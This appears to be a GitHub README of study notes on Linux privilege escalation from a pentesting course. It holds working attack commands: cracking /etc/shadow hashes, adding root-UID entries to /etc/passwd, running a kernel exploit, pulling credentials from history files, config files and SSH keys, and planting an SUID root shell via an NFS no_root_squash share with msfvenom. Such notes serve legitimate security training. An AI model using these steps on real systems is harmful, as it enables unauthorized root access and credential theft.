## Linux Privilege Escalation

![68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f44415a73453256555141415f62705a2e6a7067](https://user-images.githubusercontent.com/87951795/131122135-fea9fb57-8ea1-4a2a-8969-347305dc1814.jpg)

Windows / Linux Local Privilege Escalation Workshop: https://github.com/sagishahar/lpeworkshop
Linux PrivEsc cheatsheets: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

Tools:
- https://github.com/diego-treitos/linux-smart-enumeration
- https://github.com/rebootuser/LinEnum

Other Tools:
- https://github.com/linted/linuxprivchecker
- https://github.com/AlessandroZ/BeRoot
- http://pentestmonkey.net/tools/audit/unix-privesc-check

Strategy:
1. Check your user (id, whoami).
2. Run Linux Smart Enumeration with increasing levels.
3. Run LinEnum & other scripts as well!
4. If your scripts are failing and you don’t know why, you can always run 
the manual commands from this course, and other Linux PrivEsc
cheatsheets online (e.g. https://blog.g0tmi1k.com/2011/08/basic-
linux-privilege-escalation/)
5. If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file. cat ~/.*history 
6. Have a quick look around for files in your user’s home directory and other common locations (e.g. /var/backup, /var/logs).
7. Try things that don’t have many steps first, e.g. Sudo, Cron Jobs, SUID files.
8. Have a good look at root processes, enumerate their versions and search for exploits.
9. Check for internal ports that you might be able to forward to your attacking machine.
10. At the end start to think about Kernel Exploits


Permissions in Linux:
- User accounts are configured in the /etc/passwd file.
- User password hashes are stored in the /etc/shadow file.
- Groups are configured in the /etc/group file.
  - Users have a primary group (has the same name  as their user account), and can have multiple secondary (or supplementary) groups.
- Users are identified by an integer user ID (UID). (root (UID) = 0) (id & cat /proc/$$/status | grep "[UG]id")
  - Real: A user’s real ID is who they actually are (the ID defined in /etc/passwd).
  - Effective: A user’s effective ID is normally equal to their real ID, however when executing a process as another user, the effective ID is set to that user’s real ID
  - Saved: saved ID is used to ensure that SUID processes can temporarily switch a user’s effective ID back to their real ID and back again without losing track of the original effective ID.

Files & Directories:  
![linux-file---folder-permissions](https://user-images.githubusercontent.com/87951795/131246543-ed68873f-40e0-49ba-b313-0e66c32baf52.gif)
- Files
  - Read – when set, the file contents can be read.
  - Write – when set, the file contents can be modified.
  - Execute – when set, the file can be executed (i.e. run as some kind of process).
- Directories
  - Execute – when set, the directory can be entered. Without this permission, neither the read nor write permissions will work.
  - Read – when set, the directory contents can be listed.
  - Write – when set, files and subdirectories can be created in the directory.
- Special Permissions
  - SUID: When set, files will get executed with the privileges of the file owner.
  - SGID: When set on a file, the file will get executed with the privileges of the file group. When set on a directory, files created within that directory will inherit the group of the directory itself.
  - -r-sr-sr-x The first s stands for the SUID and the second one stands for SGID.

## The kernel exploit:
Should be a last resort as kernel exploits can often be unstable and may be one shot or cause a system crash.
1. Enumerate kernel version (uname -a).
2. Find matching exploits use Linux Exploit Suggester 2 or (Google, ExploitDB, GitHub).  
  - https://github.com/jondonas/linux-exploit-suggester-2
```
./linux-exploit-suggester.pl -k (karnel vertion from uname -a)

or

searchsploit linux kernel 2.6.32 priv esc
searchsploit linux kernel 2.6 debian priv esc
```
3. Compile and run.
```
gcc -pthread c0w.c -o c0w
./c0w
/usr/bin/passwd
```
## Weak File Permissions
- Readable /etc/shadow:
  - cat /etc/shadow (copy password hash found between the first and second colons : to file)
  - john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
- Writable /etc/shadow:
  - mkpasswd -m sha-512 newpasswordhere
  - Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.
- Writable /etc/passwd 
  - if the second field of a user row in /etc/passwd contains a password hash, it takes precedent over the hash in /etc/shadow.
    - root: x:0:0:root:/root:/bin/bash
    - The “x” instructs Linux to look for the password hash in the /etc/shadow file
    - openssl passwd "password"
    - root:L9yLGxncbOROc:0:0:root:/root:/bin/bash
  - Alternatively, if we can only append to the file, we can create a new user but assign them the root user ID (0). This works because Linux allows multiple entries for the same user ID, as long as the usernames are different
    - newroot:L9yLGxncbOROc:0:0:root:/root:/bin/bash
  - In some versions of Linux, it is possible to simply delete the “x”, which Linux interprets as the user having no password
    - root::0:0:root:/root:/bin/bash
- Backups
  - It is always worth exploring the file system looking for readable backup files. Some common places include user home directories, the / (root) directory, /tmp, and /var/backups.
    - ls -la /home/user
    - ls -la /
    - ls -la /tmp
    - ls -la /var/backups
    - ls -l /.ssh
  - If we have a ssh key
    - confirm that root logins are even allowed via SSH:
    - grep PermitRootLogin /etc/ssh/sshd_config
    - chmod 600 root_key
  
## Passwords & Keys
- History Files
  - View the contents of hidden files in the user’s home directory with filenames ending in “history
```
cat ~/.*history | less
cat .bash_history
```
- Config Files
  - Many services and programs use configuration (config) files to store settings.
  - If a service needs to authenticate to something, it might store the credentials in a config file.
  - If these config files are accessible, and the passwords they store are reused by privileged users, we may be able to use it to log in as that user. 
```
cat myvpn.ovpn
cat /etc/openvpn/auth.txt
```
- SSH Keys
  - SSH keys can be used instead of passwords to authenticate users using SSH.
```
ls -l /.ssh
cat /.ssh/root_key
```

## NFS
NFS (Network File System) is a popular distributed file system.
NFS shares are configured in the /etc/exports file.
Remote users can mount shares, access, create, modify files.
By default, created files inherit the remote user’s id and group id 
(as owner and group respectively), even if they don’t exist on the 
NFS server.
- Show the NFS server’s export list:
  - showmount -e <target>
- Similar Nmap script:
  - nmap –sV –script=nfs-showmount <target>
- Mount an NFS share:
  - mount -o rw,vers=2 <target>:<share> <local_directory>

1. Check the contents of /etc/exports for shares with the no_root_squash option:
```
cat /etc/exports
```
2. Confirm that the NFS share is available for remote mounting
```
showmount -e <target>
```
3. Create a mount point on your local machine and mount the /tmp NFS share
```
mkdir /tmp/nfs
mount -o rw,vers=2 <target>:<share> /tmp/nfs
```
4. Using the root user on your local machine, generate a payload and save it to the mounted share 
```
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```
5. Make sure the file has the SUID bit set, and is executable by everyone:
  ```
  chmod +xs /tmp/nfs/shell.elf
  ```
6. On the target machine, execute the file to get a root shell:
  ```
  /tmp/shell.elf
  ```
  
  
  
